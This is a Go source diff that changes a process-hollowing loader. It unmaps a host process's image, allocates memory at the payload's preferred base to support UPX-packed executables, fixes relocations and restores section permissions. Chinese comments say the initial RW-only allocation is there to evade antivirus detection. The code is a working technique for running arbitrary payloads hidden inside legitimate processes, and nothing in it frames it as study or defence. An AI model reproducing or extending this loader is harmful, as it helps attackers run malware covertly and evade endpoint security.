@@ -78,22 +78,51 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		uintptr(unsafe.Pointer(&returnLength)),
 	)
 
-	// 🌟 修复: 移除 NtUnmapViewOfSection，防止 Win10+ 加载器由于模块缺失拒绝修复导入表 (IAT)
-	// 我们转而让操作系统分配全新的地址空间
+	// 🌟 UPX 与 ASLR 双轨兼容核心修复：
+	var hostImageBase uint64
+	var bytesRead uintptr
+	procReadProcessMemory.Call(
+		uintptr(pi.Process),
+		pbi.PebBaseAddress+16,
+		uintptr(unsafe.Pointer(&hostImageBase)),
+		8,
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+
+	payloadImageBase := ntHeader.OptionalHeader.ImageBase
+
+	// 如果宿主和 Payload 想要的基址冲突了，优先卸载宿主给 Payload 腾地方 (专治 UPX 等无重定位表的硬编码程序)
+	if hostImageBase == payloadImageBase {
+		procNtUnmapViewOfSection.Call(uintptr(pi.Process), uintptr(hostImageBase))
+	}
+
+	// 首选方案：强行在 Payload 期望的基址分配内存 (这样 delta = 0，UPX 等程序完美运行)
 	allocAddress, _, _ := procVirtualAllocEx.Call(
 		uintptr(pi.Process),
-		0, // 🌟 传 0 让系统寻找空闲空间，避开原宿主占用的区域
+		uintptr(payloadImageBase),
 		uintptr(ntHeader.OptionalHeader.SizeOfImage),
 		uintptr(MEM_COMMIT|MEM_RESERVE),
-		uintptr(PAGE_READWRITE), // 🌟 修复防杀软: 初始仅分配普通 RW 读写权限，绝不直接给 RWX
+		uintptr(PAGE_READWRITE), // 依然保持防杀软的 RW 初始权限
 	)
+
+	// 备选方案：如果首选地址不可用 (例如被系统强占)，再退回到让系统随机分配，走 ASLR 重定位修复逻辑
+	if allocAddress == 0 {
+		allocAddress, _, _ = procVirtualAllocEx.Call(
+			uintptr(pi.Process),
+			0, // 0 代表随机分配
+			uintptr(ntHeader.OptionalHeader.SizeOfImage),
+			uintptr(MEM_COMMIT|MEM_RESERVE),
+			uintptr(PAGE_READWRITE),
+		)
+	}
+
 	if allocAddress == 0 {
 		return 0, fmt.Errorf("VirtualAllocEx failed")
 	}
 
 	sectionHeaderOffset := uint32(dosHeader.E_lfanew) + uint32(unsafe.Sizeof(*ntHeader))
 	
-	// 🌟 核心功能补充: 手工解析并修复 PE 重定位表 (Base Relocation)，对抗 ASLR
+	// 手工解析并修复 PE 重定位表 (Base Relocation)，对抗 ASLR (仅在 delta != 0 时执行)
 	rvaToOffset := func(rva uint32) uint32 {
 		for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
 			sec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payload[sectionHeaderOffset+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))]))
@@ -104,7 +133,6 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		return rva
 	}
 
-	payloadImageBase := ntHeader.OptionalHeader.ImageBase
 	delta := uint64(allocAddress) - payloadImageBase
 	
 	if delta != 0 {
@@ -157,7 +185,7 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		}
 	}
 
-	// 🌟 核心功能补充: 动态恢复内存区段权限 (VirtualProtectEx)
+	// 动态恢复内存区段权限 (VirtualProtectEx)
 	var oldProtect uint32
 	// 锁定 PE 头只读
 	procVirtualProtectEx.Call(uintptr(pi.Process), allocAddress, uintptr(ntHeader.OptionalHeader.SizeOfHeaders), 0x02, uintptr(unsafe.Pointer(&oldProtect)))
@@ -193,7 +221,7 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		}
 	}
 
-	// 🌟 修复: 使用我们安全封装好的对齐 Context，彻底解决崩溃
+	// 使用安全封装好的对齐 Context
 	alignCtx, ctxBuf := NewAlignedContext()
 	defer func() { _ = ctxBuf }() // 保持底层数组在 GC 中的活跃状态
 	alignCtx.ContextFlags = CONTEXT_FULL
